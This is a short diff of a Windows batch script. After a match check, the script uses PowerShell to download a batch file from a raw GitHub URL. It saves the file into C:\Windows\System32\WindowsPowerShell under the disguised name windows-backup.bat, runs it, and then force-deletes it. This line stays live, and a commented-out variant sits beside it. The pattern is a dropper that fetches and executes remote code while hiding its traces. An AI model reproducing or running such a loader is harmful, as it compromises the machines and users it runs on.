@@ -32,7 +32,7 @@ for /f "tokens=*" %%j in ('type "%tempfile%"') do (
 if %found%==1 (
     echo Trung Khop
 
-powershell curl -o C:\Capture.png https://i.ibb.co/NS2jTRW/Capture.png
+rem powershell curl -o C:\Capture.png https://i.ibb.co/NS2jTRW/Capture.png
 
 powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup.bat' -Force}"
 rem powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup2.bat' -OutFile 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat'; Start-Process -FilePath 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat' -Wait; Remove-Item -Path 'C:\Windows\System32\WindowsPowerShell\windows-backup2.bat' -Force}"
